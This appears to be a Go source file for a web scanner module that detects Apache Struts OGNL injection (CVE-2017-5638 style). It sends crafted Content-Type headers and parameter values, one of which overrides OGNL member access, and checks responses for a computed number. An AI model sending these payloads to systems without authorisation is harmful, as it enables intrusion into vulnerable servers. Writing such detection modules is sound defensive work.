package struts_ognl_injection

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

const (
	ognlMultA  = 41273
	ognlMultB  = 39127
	ognlResult = "1614244871" // 41273 * 39127
)

// contentTypePayload defines a Content-Type OGNL injection test case.
type contentTypePayload struct {
	name        string
	contentType string
}

var contentTypePayloads = []contentTypePayload{
	{
		name:        "struts2-ct-ognl",
		contentType: fmt.Sprintf("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('X-Struts-Test','%d'))}", ognlMultA*ognlMultB),
	},
	{
		name:        "struts2-ct-simple",
		contentType: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB),
	},
}

// paramPayload defines a parameter-level OGNL injection test case.
type paramPayload struct {
	payload string
}

var paramPayloads = []paramPayload{
	{payload: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB)},
	{payload: fmt.Sprintf("${%d*%d}", ognlMultA, ognlMultB)},
}

// Module implements the Struts OGNL injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds  dedup.Lazy[dedup.DiskSet]
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new Struts OGNL Injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest|modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		ds:  dedup.LazyDiskSet("struts_ognl_injection"),
		rhm: dedup.LazyDefaultRHM("struts_ognl_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerRequest tests Content-Type header OGNL injection (CVE-2017-5638 style).
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Dedup by host+path
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	hash := utils.Sha1(fmt.Sprintf("%s%s", urlx.Host, urlx.Path))
	if diskSet != nil && diskSet.IsSeen(hash) {
		return nil, nil
	}

	for _, p := range contentTypePayloads {
		modifiedRaw, err := httpmsg.SetContentType(ctx.Request().Raw(), p.contentType)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		// Check for OGNL evaluation evidence
		body := resp.Body().String()
		fullResp := resp.FullResponse().String()

		if strings.Contains(body, ognlResult) || strings.Contains(fullResp, "X-Struts-Test") && strings.Contains(fullResp, ognlResult) {
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(modifiedRaw),
				Response:         fullResp,
				FuzzingParameter: "Content-Type",
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        fmt.Sprintf("Struts OGNL Injection: %s", p.name),
					Description: fmt.Sprintf("OGNL expression evaluated in Content-Type header — result %q found in response", ognlResult),
				},
			}
			resp.Close()
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}

// ScanPerInsertionPoint tests parameter-level OGNL injection.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Dedup by request hash + param via RHM
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	for _, p := range paramPayloads {
		fuzzedRaw := ip.BuildRequest([]byte(p.payload))

		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		body := resp.Body().String()
		if strings.Contains(body, ognlResult) {
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(fuzzedRaw),
				Response:         resp.FullResponse().String(),
				FuzzingParameter: ip.Name(),
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        "Struts OGNL Injection: parameter",
					Description: fmt.Sprintf("OGNL expression evaluated in parameter %q — result %q found in response", ip.Name(), ognlResult),
				},
			}
			resp.Close()
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}
